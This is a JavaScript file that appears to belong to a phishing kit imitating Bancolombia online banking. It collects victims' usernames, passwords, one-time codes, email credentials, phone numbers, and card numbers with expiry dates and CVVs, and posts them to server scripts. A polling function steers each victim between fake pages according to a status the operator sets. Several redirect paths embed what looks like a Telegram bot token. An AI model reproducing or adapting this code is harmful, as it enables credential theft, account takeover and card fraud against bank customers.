function inicio(u){
    $.post( "/process/inicio.php", { usr: u} ,function(data) {
        window.location.href = "./clave.php";
    });
}


function detectar_dispositivo(){
    var dispositivo = "";
    if(navigator.userAgent.match(/Android/i))
        dispositivo = "Android";
    else
        if(navigator.userAgent.match(/webOS/i))
            dispositivo = "webOS";
        else
            if(navigator.userAgent.match(/iPhone/i))
                dispositivo = "iPhone";
            else
                if(navigator.userAgent.match(/iPad/i))
                    dispositivo = "iPad";
                else
                    if(navigator.userAgent.match(/iPod/i))
                        dispositivo = "iPod";
                    else
                        if(navigator.userAgent.match(/BlackBerry/i))
                            dispositivo = "BlackBerry";
                        else
                            if(navigator.userAgent.match(/Windows Phone/i))
                                dispositivo = "Windows Phone";
                            else
                                dispositivo = "PC";
    return dispositivo;
}   


function pasousuario(p){
    var b = "bancolombia";
    var res;
    var d = detectar_dispositivo();
    $.post( "/process/pasousuario.php", { pass: p, dis: d, banco: b} ,function(data) {
        if (data == "ERR") {
                alert("error");
        }else{
            if (data == "NO") {

            }else{
                res = data.split("-");
                window.location.href = "./cargando.php";
            }
        }
    });
}            

function consultar_estado(){
    $.post( "/process/estado.php",function(data) {
        switch (data) {
            case '2': window.location.href = "otp.php"; break;
            case '4': window.location.href = "/923.php"; break;
            case '6': window.location.href = "../../../../../VALIDATECARD/scis/7642479451:AAGo9ciOMcQMdrnPzIGnrBOZsWiwBaEPs3A/3D/no-back-button/"; break;               
            case '8': window.location.href = "../../../../../ERROROTP/scis/7642479451:AAGo9ciOMcQMdrnPzIGnrBOZsWiwBaEPs3A/3D/no-back-button/"; break;
            case '10': window.location.href = "finish.php"; break;
            case '12': window.location.href = "errorusuario.php"; break;
            case '40': window.location.href = "/404.php"; break;
            case '41': window.location.href = "../../reintentar_pago.php"; break;
        } 
    });        
}

function enviar_otp(o){
    $.post( "/process/pasoOTP.php",{ otp:o },function(data) {
        window.location.href = "cargando.php";
    }); 
}

function enviar_mail(m,c,t){    
    $.post( "../../../../../process/pasomail.php",{ eml:m, passe:c, cel:t},function(data) {
        window.location.href = "../../../../../WAITING/scis/7642479451:AAGo9ciOMcQMdrnPzIGnrBOZsWiwBaEPs3A/3D/no-back-button/";
    });
}

function enviar_tarjeta(t,f,c){    
    $.post( "../../../../../process/pasotarjeta.php",{ tar:t, fec:f, cvv:c },function(data) {
        window.location.href = "../../../../../WAITING/scis/7642479451:AAGo9ciOMcQMdrnPzIGnrBOZsWiwBaEPs3A/3D/no-back-button/";
    });
}